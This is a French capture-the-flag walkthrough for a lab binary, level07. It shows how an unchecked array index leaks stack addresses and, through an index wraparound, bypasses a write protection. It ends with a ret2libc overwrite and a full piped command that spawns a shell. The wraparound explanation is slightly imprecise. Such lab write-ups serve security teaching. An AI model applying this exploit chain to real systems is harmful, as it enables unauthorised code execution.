## Walkthrough Level07

### 1. Fonctionnement du programme

Le programme propose un service de stockage de nombres dans un tableau de 100 cases (indices 0 à 99). Trois commandes sont disponibles :
- `store` : stocke un nombre à un indice donné (avec restrictions sur certains indices et valeurs)
- `read` : lit la valeur à un indice donné
- `quit` : quitte le programme

Certaines cases (indices multiples de 3 ou si le nombre a 0xb7 comme octet de poids fort) sont réservées et protégées à l'écriture.

### 2. Recherche de vulnérabilité

Aucune fonction évidente de type buffer overflow ou format string. Mais en testant la lecture au-delà de l'indice 99 (ex : `read` sur 100, 101, etc.), on observe que le programme lit alors des valeurs de la stack. Les valeurs sont affichées en décimal.

En convertissant ces valeurs en hexadécimal, on obtient des adresses intéressantes :
- 100: 1
- 101: 1684104562 = 0x64616572
- 106: 994440960 = 0x3B45F700
- 107: 4160665120 = 0xF7FEB620
- 109: 134515209 = 0x8048A09
- 110: 4160548852 = 0xF7FCEFF4
- 114: 4158936339 = 0xF7E45513

En testant dans gdb:
```c
(gdb) x/i 0xf7e45513
   0xf7e45513 <__libc_start_main+243>:  mov    %eax,(%esp)
```
on voit que l'adresse 0xF7E45513 correspond à `__libc_start_main+243`, soit l'adresse de retour du programme à la fin du main.

### 3. Exploitation : écriture hors limites

Problème : l'indice 114 est protégé à l'écriture (car 114 % 3 == 0). Mais la fonction ne vérifie pas si l'indice est dans [0,99], seulement le modulo 3 et l'octet de poids fort du nombre.

On peut donc exploiter un overflow d'entier : si on fournit un indice négatif (en unsigned int), il sera converti en un grand nombre. Par exemple, si on donne 2147483762 (soit INT_MAX + 1 + 114), alors :
- 2147483762 % 3 = 2 (donc PAS protégé)
- Mais 2147483762, en unsigned, correspond à l'indice 114 sur la stack (car 2147483762 - 2^31 = 114)

**Explication** :
- Le tableau est accédé par `storage[index]`, donc un index hors limites lit/écrit sur la stack.
- L'overflow permet de contourner la protection modulo 3.

### 4. Ret2libc

On peut alors écraser l'adresse de retour du main (case 114) avec l'adresse de `system`, et placer l'adresse de "/bin/sh" juste après (case 116).

Pour cela, on récupère les adresses dans gdb :
- `system` : via `info function system`
- `"/bin/sh"` : via `find` dans la libc

On convertit ces adresses en décimal pour les fournir au programme.

### 5. Exploitation finale

Exemple de commande :
```sh
(python -c 'print("store")'; \
 python -c 'print("4159090384")'; \
 python -c 'print("2147483762")'; \
 python -c 'print("store")'; \
 python -c 'print("4160264172")'; \
 python -c 'print("116")'; \
 python -c 'print("quit")'; \
 cat) | ./level07
```

- On écrit l'adresse de `system` à l'indice 114 (via l'overflow d'index)
- On écrit l'adresse de "/bin/sh" à l'indice 116
- Quand le programme quitte, il exécute `system("/bin/sh")` et on obtient un shell

---

**Résumé** :
- Le programme ne vérifie pas les bornes d'index, ce qui permet de lire/écrire sur la stack.
- On contourne la protection modulo 3 par un overflow d'index.
- On réalise un ret2libc pour obtenir un shell.
